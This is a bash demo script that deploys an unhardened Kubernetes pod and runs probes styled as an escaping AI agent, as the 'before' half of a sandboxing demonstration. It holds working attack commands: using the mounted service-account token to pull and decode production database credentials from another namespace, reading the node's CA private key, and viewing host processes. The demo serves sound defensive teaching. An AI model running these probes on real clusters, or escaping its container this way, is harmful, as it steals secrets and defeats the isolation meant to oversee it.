#!/usr/bin/env bash
# 02-attack-unsecured.sh — deploy a PLAIN Kubernetes Pod (no Sandbox, no
# hardening) and run an "agent" that tries to escape. Every probe SUCCEEDS —
# not because we did anything exotic, but because Kubernetes' DEFAULTS are
# wide open: the admin token is auto-mounted, the container is root, the fs is
# writable, egress is unrestricted. (We only added hostPID + a hostPath mount
# for parity with the host-reach probes.) This is the "before" picture.
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

POD="unsecured-agent"

step "Deploying a PLAIN Kubernetes Pod — no Sandbox, no hardening, just defaults"
run kubectl apply -f "${MANIFESTS}/unsecured/rbac.yaml"
run kubectl apply -f "${MANIFESTS}/unsecured/pod.yaml"
info "waiting for the Pod to become Ready..."
run kubectl -n "${NAMESPACE}" wait --for=condition=Ready "pod/${POD}" --timeout=120s
good "pod '${POD}' is running"

echo
echo "${BOLD}Pretend the lines below are an LLM-generated agent running inside the box.${RESET}"

# --- Probe 1: steal a cluster-admin API token and read another team's secret --
probe "Read a secret from the 'corp-secrets' namespace via the Kubernetes API"
if sbexec "${POD}" sh -c '
    SA=/var/run/secrets/kubernetes.io/serviceaccount
    test -f "$SA/token" || { echo "no token mounted"; exit 7; }
    curl -s --max-time 10 --cacert "$SA/ca.crt" \
      -H "Authorization: Bearer $(cat "$SA/token")" \
      "https://kubernetes.default.svc/api/v1/namespaces/corp-secrets/secrets/prod-db-credentials" \
    | jq -r "\"username=\" + (.data.username|@base64d) + \"  password=\" + (.data.password|@base64d)" \
    | grep -q password'; then
  LOOT=$(sbexec "${POD}" sh -c '
    SA=/var/run/secrets/kubernetes.io/serviceaccount
    curl -s --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat "$SA/token")" \
      "https://kubernetes.default.svc/api/v1/namespaces/corp-secrets/secrets/prod-db-credentials" \
    | jq -r "(.data.username|@base64d) + \" / \" + (.data.password|@base64d)"')
  breached "exfiltrated prod DB credentials: ${LOOT}"
else
  contained "API read failed (unexpected for the unsecured box)"
fi

# --- Probe 2: read the cluster CA private key off the host filesystem ----------
probe "Read the cluster CA private key from the node's filesystem"
if sbexec "${POD}" sh -c 'head -c 64 /host/etc/kubernetes/pki/ca.key >/dev/null 2>&1'; then
  HOSTNAME_FILE=$(sbexec "${POD}" cat /host/etc/hostname 2>/dev/null || true)
  breached "node root is mounted at /host — read /etc/kubernetes/pki/ca.key on node '${HOSTNAME_FILE}'"
  info "first line of the stolen CA key:"
  sbexec "${POD}" sh -c 'head -n1 /host/etc/kubernetes/pki/ca.key' 2>/dev/null | sed 's/^/      /' || true
else
  contained "host filesystem not reachable (unexpected for the unsecured box)"
fi

# --- Probe 3: see every process on the node (host PID namespace) ---------------
probe "List host processes (control-plane components) from inside the pod"
if sbexec "${POD}" sh -c 'ps -eo pid,comm 2>/dev/null | grep -E "kube-apiserver|etcd|kubelet" | head -n5' ; then
  breached "host PID namespace shared — the agent can see & signal node/control-plane processes"
else
  contained "host processes not visible (unexpected for the unsecured box)"
fi

# --- Probe 4: identity + root filesystem ---------------------------------------
probe "Check in-container identity and filesystem"
ID=$(sbexec "${POD}" id 2>/dev/null || true)
info "id -> ${ID}"
if sbexec "${POD}" sh -c 'echo pwned > /malware && rm -f /malware' >/dev/null 2>&1; then
  breached "running as root with a writable root filesystem"
fi

echo
echo "${RED}${BOLD}Summary: a plain Kubernetes Pod, straight off the defaults, is wide open —${RESET}"
echo "${RED}it leaked production credentials, the cluster CA key, and full node access.${RESET}"
echo "${DIM}Security is opt-IN. Now run ./scripts/03-defend-secured.sh to see it contained.${RESET}"
